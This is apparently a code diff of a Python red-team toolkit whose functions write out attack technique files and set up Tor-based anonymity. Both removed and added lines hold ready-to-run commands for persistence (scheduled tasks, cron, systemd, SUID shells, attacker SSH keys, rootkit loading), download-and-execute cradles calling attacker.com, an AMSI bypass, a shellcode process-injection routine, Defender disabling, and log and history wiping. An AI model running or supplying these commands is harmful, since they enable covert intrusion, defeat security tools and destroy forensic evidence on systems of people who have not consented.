-schtasks /create /tn "Adobe Updater" /tr "C:\\Program Files\\Common Files\\Adobe\\update.exe" /sc daily /st 09:00 /f
+# Scheduled Task
+schtasks /create /tn "SystemService" /tr "C:\\path\\to\\payload.exe" /sc onlogon /ru SYSTEM /f
 
-# Services
-sc create "WindowsDefenderService" binpath= "C:\\Windows\\System32\\defender.exe" start= auto
-sc description "WindowsDefenderService" "Windows Defender Antivirus Service"
+## Linux Persistence
+# Cron Job
+(crontab -l 2>/dev/null; echo "* * * * * /path/to/payload") | crontab -
 
-# WMI event subscription
-wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
-
-# COM hijacking
-reg add "HKCU\\Software\\Classes\\CLSID\\{{CLSID}}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\com.dll" /f
-
-# Startup folder
-copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"
-
-# DLL hijacking
-copy legitimate.exe C:\\temp\\
-copy malicious.dll C:\\temp\\legitimate_dependency.dll
-
-# Reflective DLL injection
-powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"
-
-# Registry-less COM
-regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll
-
-# Fileless execution
-powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"
-
-# UAC bypass
-eventvwr.exe
-# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
-
-# Disable Windows Defender
-powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
-powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
-"""
-
-        # Linux persistence
-        linux_persist_content = f"""# Linux Persistence Mechanisms for {target}
-
-# Crontab persistence
-echo "*/10 * * * * /tmp/.update >/dev/null 2>&1" | crontab -
-echo "@reboot /tmp/.update >/dev/null 2>&1" | crontab -
-
-# Systemd service
-cat > /etc/systemd/system/system-update.service << EOF
+# Service
+cat > /etc/systemd/system/service.service << EOF
 [Unit]
-Description=System Update Service
+Description=Service
 After=network.target
 
 [Service]
-Type=forking
-ExecStart=/tmp/.update
+Type=simple
+ExecStart=/path/to/payload
 Restart=always
-User=root
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-systemctl enable system-update.service
-systemctl start system-update.service
-
-# Init.d script
-cat > /etc/init.d/system-update << EOF
-#!/bin/bash
-case "\$1" in
-    start)
-        /tmp/.update &
-        ;;
-    stop)
-        pkill -f .update
-        ;;
-    restart)
-        \$0 stop
-        \$0 start
-        ;;
-esac
-EOF
-
-chmod +x /etc/init.d/system-update
-update-rc.d system-update defaults
-
-# SSH key harvesting
-mkdir -p ~/.ssh
-echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-
-# Bash profile persistence
-echo "/tmp/.update &" >> ~/.bashrc
-echo "/tmp/.update &" >> ~/.profile
-
-# LD_PRELOAD
-echo "/lib/evil.so" >> /etc/ld.so.preload
-
-# SUID backdoor
-cp /bin/bash /tmp/.bash
-chmod +s /tmp/.bash
-
-# Kernel module persistence (advanced)
-insmod /tmp/rootkit.ko
-echo "/tmp/rootkit.ko" >> /etc/modules
+systemctl enable service.service
 """
-
-        self.script_gen.safe_write("windows_persistence_advanced.txt", win_persist_content)
-        self.script_gen.safe_write("linux_persistence_advanced.txt", linux_persist_content)
-        self.print_colored("📁 Advanced persistence scripts generated", "CYAN")
-
-    def _generate_antiforensics_scripts(self):
-        """Generate anti-forensics and cleanup scripts"""
-        antiforensics_content = """# Anti-Forensics and Cleanup Script
-
-# Clear Windows event logs
-wevtutil cl System
-wevtutil cl Security  
-wevtutil cl Application
-wevtutil cl "Windows PowerShell"
-wevtutil cl "Microsoft-Windows-PowerShell/Operational"
-
-# Clear Linux logs
-rm -f /var/log/auth.log*
-rm -f /var/log/syslog*
-rm -f /var/log/messages*
-rm -f /var/log/secure*
-rm -f ~/.bash_history
-history -c
-
-# Clear command history
-del %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
-rm ~/.bash_history ~/.zsh_history ~/.python_history
-
-# Timestomp files (Windows)
-powershell "$(Get-Item file.exe).creationtime=$(Get-Date '01/01/2020 12:00 am')"
-powershell "$(Get-Item file.exe).lastaccesstime=$(Get-Date '01/01/2020 12:00 am')"
-powershell "$(Get-Item file.exe).lastwritetime=$(Get-Date '01/01/2020 12:00 am')"
-
-# Secure delete
-sdelete -p 3 -s -z C:
-shred -vfz -n 3 /path/to/file
-
-# Clear registry traces
-reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f
-reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f
-
-# Clear prefetch
-del C:\\Windows\\Prefetch\\*.pf
-
-# Clear temp files
-del /q /s %TEMP%\\*
-rm -rf /tmp/* /var/tmp/*
-
-# Clear browser artifacts
-del "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History"
-del "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite"
-
-# Network artifact cleanup
-arp -d *
-netsh interface ip delete arpcache
-ip -s -s neigh flush all
-"""
-        
-        script_path = self.script_gen.safe_write("antiforensics_cleanup.txt", antiforensics_content)
-        if script_path:
-            self.print_colored(f"📁 Anti-forensics script: {script_path}", "CYAN")
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("persistence_setup.txt", persistence_content)
+            if script_path:
+                self.print_colored(f"📁 Persistence mechanisms: {script_path}", "GREEN")
 
     def _generate_evasion_scripts(self):
-        """Generate AV/EDR evasion scripts"""
+        """Generate AV/EDR evasion scripts and techniques"""
         evasion_content = """# AV/EDR Evasion Techniques
 
-# PowerShell execution policy bypass
-powershell -ExecutionPolicy Bypass -File script.ps1
-powershell -c "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"
+## Payload Obfuscation
+# PowerShell Obfuscation
+$payload = 'powershell -enc BASE64_ENCODED_PAYLOAD'
+$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+powershell -enc $encoded
 
-# AMSI bypass
-powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+## Process Injection
+# CreateRemoteThread
+#include <windows.h>
+int main() {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TARGET_PID);
+    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, sizeof(shellcode), NULL);
+    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
+    CloseHandle(hProcess);
+    return 0;
+}
 
-# PowerShell download cradles
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
-powershell -c "IEX(IWR('http://attacker.com/script.ps1') -UseBasicParsing).Content"
-
-# Living off the land binaries
-certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
-bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\temp\\payload.exe
-
-# Process hollowing
-# Use tools like ProcessHacker or custom C# code
-
-# DLL sideloading
-copy legitimate.exe C:\\temp\\
-copy malicious.dll C:\\temp\\legitimate_dependency.dll
-
-# Reflective DLL injection
-powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"
-
-# Registry-less COM
-regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll
-
-# Fileless execution
-powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"
-
-# UAC bypass
-eventvwr.exe
-# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
-
-# Disable Windows Defender
-powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
-powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
+## AMSI Bypass
+# PowerShell AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 """
-        
-        script_path = self.script_gen.safe_write("evasion_techniques.txt", evasion_content)
-        if script_path:
-            self.print_colored(f"📁 Evasion techniques script: {script_path}", "CYAN")
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("evasion_techniques.txt", evasion_content)
+            if script_path:
+                self.print_colored(f"📁 Evasion techniques: {script_path}", "GREEN")
+
+    def _generate_antiforensics_scripts(self):
+        """Generate anti-forensics scripts"""
+        antiforensics_content = """# Anti-Forensics Techniques
+
+## Log Clearing
+# Windows Event Log
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Linux Logs
+echo > /var/log/auth.log
+echo > /var/log/syslog
+echo > ~/.bash_history
+history -c
+
+## Secure Deletion
+# Windows
+cipher /w:C:\\path\\to\\directory
+
+# Linux
+shred -zvu -n 10 /path/to/file
+
+## Timestamp Manipulation
+# Windows
+powershell -command "$(Get-Item 'file.txt').LastWriteTime = Get-Date '01/01/2020 12:00:00'""
+
+# Linux
+touch -t 202001010000.00 file.txt
+"""
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("antiforensics.txt", antiforensics_content)
+            if script_path:
+                self.print_colored(f"📁 Anti-forensics techniques: {script_path}", "GREEN")
 
     def run_opsec_anonymity(self, target: str):
         """Execute OPSEC and anonymity infrastructure setup"""
         self.print_colored(f"🔒 Running OPSEC & Anonymity Infrastructure for: {target}", "GREEN", True)
         print()
         
-        # Check current IP and VPN status
-        self._check_vpn_status()
-        
-        # Configure Tor
-        self._configure_tor_setup()
-        
-        # Configure ProxyChains
-        self._configure_proxychains()
-        
-        # Setup stealth iptables rules
-        self._configure_stealth_iptables()
-        
-        # Generate OPSEC checklist
-        self._generate_opsec_checklist()
+        try:
+            # Check if tor_service.py exists, if not create it
+            tor_service_path = self.toolkit_dir / "configs" / "tor_service.py"
+            if not tor_service_path.exists():
+                self._generate_tor_service_module(tor_service_path)
+                self.print_colored(f"✅ Created tor_service.py module at {tor_service_path}", "GREEN")
+            
+            try:
+                # Import TorService only when needed
+                sys.path.insert(0, str(self.toolkit_dir / "configs"))
+                from tor_service import TorService
+                
+                # Initialize TorService with current loot directory and logger
+                tor_service = TorService(self.tool_executor.loot_dir if self.tool_executor else None, self.logger)
+                
+                # Check VPN status
+                vpn_status = tor_service.check_public_ip()
+                if vpn_status.get("success", False):
+                    self.print_colored(f"📍 Public IP: {vpn_status.get('ip', 'Unknown')}", "CYAN")
+                else:
+                    self.print_colored("❌ Failed to check public IP", "RED")
+                
+                # Configure and start Tor
+                if tor_service.configure_tor():
+                    self.print_colored("✅ Tor configuration generated", "GREEN")
+                    
+                    tor_result = tor_service.start_tor_service()
+                    if tor_result.get("success", False):
+                        self.print_colored("✅ Tor service started", "GREEN")
+                    else:
+                        self.print_colored(f"❌ Failed to start Tor: {tor_result.get('error', 'Unknown error')}", "RED")
+                
+                # Configure proxychains
+                if tor_service.configure_proxychains():
+                    self.print_colored("✅ ProxyChains configuration generated", "GREEN")
+                
+                # Configure stealth iptables
+                if tor_service.configure_stealth_iptables():
+                    self.print_colored("✅ Iptables stealth configuration generated", "GREEN")
+                    
+                    iptables_result = tor_service.apply_iptables_rules()
+                    if iptables_result.get("success", False):
+                        self.print_colored("✅ Stealth iptables rules applied", "GREEN")
+                    else:
+                        self.print_colored(f"❌ Failed to apply iptables rules: {iptables_result.get('error', 'Unknown error')}", "RED")
+                
+                # Generate OPSEC checklist
+                checklist_path = tor_service.generate_opsec_checklist()
+                if checklist_path:
+                    self.print_colored(f"📁 OPSEC checklist: {checklist_path}", "GREEN")
+                
+            except ImportError:
+                # Generate OPSEC checklist as fallback
+                self._generate_opsec_checklist(target)
+                
+        except Exception as e:
+            self.print_colored(f"❌ Error setting up anonymity infrastructure: {str(e)}", "RED")
+            if self.logger:
+                self.logger.error(f"OPSEC setup error: {e}\n{traceback.format_exc()}")
 
-    def _configure_tor_setup(self):
-        """Configure Tor for anonymity"""
-        tor_config = self.tool_executor.loot_dir / "torrc"
-        
-        config_content = """# Tor configuration for red team operations
-SocksPort 9050
-ControlPort 9051
-CookieAuthentication 1
-ExitPolicy reject *:*
-
-# Additional relays for better anonymity
-UseBridges 1
-ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy
-
-# Disable features that could leak info
-DisableDebuggerAttachment 1
-SafeLogging 1
-HardwareAccel 0
-
-# Directory authorities
-DirReqStatistics 0
-EntryStatistics 0
-ExtraInfoStatistics 0
-"""
-        
-        with open(tor_config, 'w') as f:
-            f.write(config_content)
-        
-        self.print_colored(f"📁 Tor config: {tor_config}", "CYAN")
-        
-        # Start Tor service
-        if self.tool_executor.check_tool("tor"):
-            self.print_colored("🔧 Starting Tor service...", "BLUE")
-            result = self.tool_executor.execute_tool(
-                "tor",
-                ["tor", "-f", str(tor_config)],
-                timeout=30
-            )
-            if result["success"]:
-                self.print_colored("✅ Tor service started", "GREEN")
-            else:
-                self.print_colored("❌ Failed to start Tor", "RED")
-
-    def _configure_stealth_iptables(self):
-        """Configure iptables for stealth"""
-        iptables_script = self.tool_executor.loot_dir / "stealth_iptables.sh"
-        
-        script_content = """#!/bin/bash
-# Stealth iptables configuration
-
-# Drop ICMP ping responses
-iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
-
-# Rate limit connections
-iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT
-iptables -A INPUT -p tcp --dport 22 -j DROP
-
-# Log and drop port scans
-iptables -A INPUT -m recent --name portscan --rcheck --seconds 86400 -j DROP
-iptables -A FORWARD -m recent --name portscan --rcheck --seconds 86400 -j DROP
-
-# Route traffic through Tor
-iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 9040
-iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 9040
-
-echo "Stealth iptables rules applied"
-"""
-        
-        with open(iptables_script, 'w') as f:
-            f.write(script_content)
-        
-        iptables_script.chmod(0o755)
-        self.print_colored(f"📁 Stealth iptables script: {iptables_script}", "CYAN")
-
-    def _configure_proxychains(self):
-        """Configure proxychains for Tor"""
-        proxychains_config = self.tool_executor.loot_dir / "proxychains.conf"
-        
-        config_content = """# ProxyChains configuration for Tor
-strict_chain
-proxy_dns
-tcp_read_time_out 15000
-tcp_connect_time_out 8000
-
-[ProxyList]
-socks5 127.0.0.1 9050
-"""
-        
-        with open(proxychains_config, 'w') as f:
-            f.write(config_content)
-        
-        self.print_colored(f"📁 ProxyChains config: {proxychains_config}", "CYAN")
-
-    def _check_vpn_status(self):
-        """Check VPN connection status"""
-        self.print_colored("🔍 Checking VPN status...", "BLUE")
-        
-        # Check public IP
-        ip_result = self.tool_executor.execute_tool(
-            "curl",
-            ["curl", "-s", "ifconfig.me"],
-            timeout=10
-        )
-        
-        if ip_result["success"]:
-            public_ip = ip_result["output"].strip()
-            self.print_colored(f"📍 Public IP: {public_ip}", "CYAN")
-        else:
-            self.print_colored("❌ Failed to check public IP", "RED")
-
-    def _generate_opsec_checklist(self):
-        """Generate OPSEC checklist"""
-        checklist_file = self.tool_executor.loot_dir / "opsec_checklist.md"
-        
-        checklist_content = """# OPSEC Checklist
+    def _generate_opsec_checklist(self, target: str):
+        """Generate OPSEC checklist as a fallback"""
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
+            
+        try:
+            checklist_file = self.tool_executor.loot_dir / f"opsec_checklist_{target}.md"
+            
+            checklist_content = """# OPSEC Checklist
 
 ## Pre-Engagement
 - [ ] VPN connection active
@@ -1890,11 +1548,15 @@ socks5 127.0.0.1 9050
 - [ ] Use domain fronting
 - [ ] Implement kill switches
 """
-        
-        with open(checklist_file, 'w') as f:
-            f.write(checklist_content)
-        
-        self.print_colored(f"📁 OPSEC checklist: {checklist_file}", "CYAN")
+            try:
+                os.makedirs(self.tool_executor.loot_dir, exist_ok=True)
+                with open(checklist_file, 'w', encoding='utf-8') as f:
+                    f.write(checklist_content)
+                self.print_colored(f"📁 OPSEC checklist: {checklist_file}", "CYAN")
+            except Exception as e:
+                self.print_colored(f"⚠️ Failed to write OPSEC checklist: {e}", "YELLOW")
+        except Exception as e:
+            self.print_colored(f"❌ Error generating OPSEC checklist: {str(e)}", "RED")
 
     def uninstall_toolkit(self):
         """Uninstall the toolkit with user confirmation"""
@@ -1906,11 +1568,11 @@ socks5 127.0.0.1 9050
         print()
         
         # Ask about keeping tools
-        self.print_colored("Do you want to keep the installed tools? (y/n): ", "CYAN", end="")
+        self.print_colored("Do you want to keep the installed tools? (y/n): ", "CYAN")
         keep_tools = input().strip().lower()
         
         print()
-        self.print_colored("Are you sure you want to proceed? (y/n): ", "RED", end="")
+        self.print_colored("Are you sure you want to proceed? (y/n): ", "RED")
         confirm = input().strip().lower()
         
         if confirm == 'y':
@@ -1985,5 +1647,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
